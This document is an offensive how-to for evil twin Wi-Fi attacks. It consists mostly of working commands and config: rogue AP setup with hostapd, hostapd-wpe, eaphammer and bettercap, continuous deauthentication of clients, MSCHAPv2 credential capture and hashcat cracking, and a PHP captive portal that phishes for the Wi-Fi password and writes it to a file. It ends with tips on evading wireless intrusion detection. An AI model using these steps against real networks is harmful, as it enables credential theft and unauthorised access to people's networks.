# Evil Twin — PSK Capture, EAP Downgrade, Captive Portal

---

## Pre-requisites

```bash
# Two wireless adapters recommended:
# wlan0 — internet uplink (or wired eth0)
# wlan1 — rogue AP (monitor/AP mode)

# OR single adapter in AP mode (no internet uplink — clients get no connectivity, quicker to detect)

# Install dependencies
apt install hostapd dnsmasq apache2 php
```

---

## WPA2-Personal evil twin (PSK capture via downgrade)

Goal: clone legitimate AP → force client deauth → client reconnects to evil twin → user enters PSK in captive portal.

```bash
# Step 1: Survey target AP
sudo airodump-ng wlan0mon
# Note: BSSID, channel, ESSID

# Step 2: Configure hostapd
cat > /tmp/evil_ap.conf << EOF
interface=wlan1
driver=nl80211
ssid=<TARGET_SSID>
hw_mode=g
channel=<target_channel>
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=WRONG_PLACEHOLDER
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF

# Step 3: Start evil AP
sudo hostapd /tmp/evil_ap.conf &

# Step 4: Deauth clients from real AP
sudo aireplay-ng -0 0 -a <REAL_AP_MAC> wlan0mon   # continuous deauth

# Step 5: Serve captive portal for PSK collection
# Set up dnsmasq for DHCP + DNS redirect
# Serve PHP page that: displays "Enter Wi-Fi password to reconnect"
# Log entered password to file, validate: pyrit/hashcat check, redirect on success
```

---

## hostapd-wpe — WPA2-Enterprise EAP credential capture

Rogue AP that accepts all EAP methods and logs credentials.

```bash
# Install
apt install hostapd-wpe

# Configure /etc/hostapd-wpe/hostapd-wpe.conf
interface=wlan1
ssid=Corporate-WiFi
channel=6
hw_mode=g
# Certs (use provided test certs or generate with openssl)
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# Start
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials logged to:
cat /var/log/hostapd-wpe.log
# Contains: username and MSCHAPv2 exchange data

# Crack MSCHAPv2 → NTLM hash
# asleap -C <mschap_chal> -R <mschap_resp> -W rockyou.txt
# OR extract NT hash from the MSCHAP exchange pair:
hashcat -m 5600 "username:::<mschap_chal>:<mschap_resp>:" rockyou.txt

# Or use chapcrack / mschapv2-offline-attack
```

---

## eaphammer — enterprise evil twin with more control

```bash
# Install
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer; pip3 install -r requirements.txt
python3 eaphammer --cert-wizard

# Start rogue AP
python3 eaphammer -i wlan1 \
  --channel 6 \
  --auth wpa-eap \
  --essid "Corporate-WiFi" \
  --creds

# Hostile portal (credentials via browser form)
python3 eaphammer -i wlan1 \
  --channel 6 \
  --auth wpa-eap \
  --essid "Corporate-WiFi" \
  --hostile-portal

# Target-specific (match legitimate AP certificate CN)
python3 eaphammer -i wlan1 \
  --channel 6 \
  --auth wpa-eap \
  --essid "Corporate-WiFi" \
  --negotiate balanced \
  --creds
```

---

## Captive portal setup (PSK collection)

```bash
# DHCP server (dnsmasq)
cat > /tmp/dnsmasq.conf << EOF
interface=wlan1
dhcp-range=192.168.2.10,192.168.2.50,12h
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/192.168.2.1
EOF

sudo dnsmasq -C /tmp/dnsmasq.conf --no-daemon &

# Configure attacker IP on AP interface
sudo ifconfig wlan1 192.168.2.1 netmask 255.255.255.0

# iptables redirect all HTTP to captive portal
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 192.168.2.1:443

# PHP captive portal — save entered PSK
cat > /var/www/html/index.php << 'EOF'
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    file_put_contents('/tmp/captured_psk.txt', $_POST['password'] . PHP_EOL, FILE_APPEND);
    echo "<h2>Connecting... please wait</h2>";
    exit;
}
?>
<html><body>
<h2>Wi-Fi Network: <?php echo htmlspecialchars($_GET['ssid'] ?? 'Network'); ?></h2>
<p>Enter your Wi-Fi password to reconnect:</p>
<form method="post">
<input type="password" name="password" placeholder="Wi-Fi Password" required>
<button type="submit">Connect</button>
</form></body></html>
EOF

# Start Apache
sudo a2enmod php8.2; sudo service apache2 start

# Monitor captured PSKs
tail -f /tmp/captured_psk.txt

# Validate PSK against real AP handshake
echo "captured_psk" | aircrack-ng -w - handshake.cap -e "<SSID>"
```

---

## bettercap evil twin + portal

```bash
sudo bettercap -iface wlan1

# In bettercap console:
>> set wifi.interface wlan0mon
>> wifi.recon on
>> wifi.assoc all      # associate with all APs to collect probes

# Evil AP module
>> set ap.ssid "Target-Network"
>> set ap.bssid AA:BB:CC:DD:EE:FF   # spoof real AP MAC
>> set ap.channel 6
>> ap.open            # open AP (no password for portal)
```

---

## Detection and duration notes

- Dual SSIDs visible → clients may see both and choose real AP → lower capture rate.
- Signal must exceed real AP for client preference → high-gain antenna or close proximity.
- Enterprise clients often validate server certificate CN → use matching CN or accept fail rate.
- Duration: keep evil twin active 15-30 min max before moving → reduces WIDS detection window.
